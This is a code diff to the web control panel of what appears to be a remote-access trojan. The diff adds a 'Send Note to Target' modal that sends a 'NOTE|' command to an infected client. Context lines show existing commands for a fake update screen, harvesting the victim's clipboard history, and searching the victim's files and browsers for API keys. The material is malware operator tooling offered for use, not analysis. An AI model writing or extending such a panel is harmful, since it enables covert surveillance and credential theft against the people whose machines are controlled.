@@ -371,6 +371,21 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
 <button class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
 <button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
+<button class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
+</div>
+</div>
+</div>
+
+<!-- Send Note Modal -->
+<div id="noteModal" class="modal">
+<div class="modal-content" style="width:600px;">
+<div class="modal-header">
+<h2>📝 Send Note to Target</h2>
+<span class="close-btn" onclick="closeNoteModal()">&times;</span>
+</div>
+<textarea id="noteText" style="width:100%;height:200px;background:#1a1a2e;color:#fff;border:1px solid #333;border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box;" placeholder="Type your note here..."></textarea>
+<div style="margin-top:15px;text-align:right;">
+<button class="btn" style="background:#4CAF50;color:#fff;" onclick="sendNote()">Send Note</button>
 </div>
 </div>
 </div>
@@ -393,10 +408,31 @@ function sendCmd(cmd) {
     form.querySelector('input[name=\"command\"]').value = cmd;
     form.submit();
 }
+function openNoteModal() {
+    closeModal();
+    document.getElementById('noteModal').style.display = 'block';
+    document.getElementById('noteText').value = '';
+    document.getElementById('noteText').focus();
+}
+function closeNoteModal() {
+    document.getElementById('noteModal').style.display = 'none';
+}
+function sendNote() {
+    var text = document.getElementById('noteText').value;
+    if (!text.trim()) { alert('Enter some text first'); return; }
+    closeNoteModal();
+    var form = document.getElementById('form-' + activeClientId);
+    form.querySelector('input[name=\"command\"]').value = 'NOTE|' + text;
+    form.submit();
+}
 window.onclick = function(event) {
     var modal = document.getElementById('quickModal');
     if (event.target == modal) {
         modal.style.display = 'none';
+    }
+    var noteModal = document.getElementById('noteModal');
+    if (event.target == noteModal) {
+        noteModal.style.display = 'none';
     }
 }
 </script>
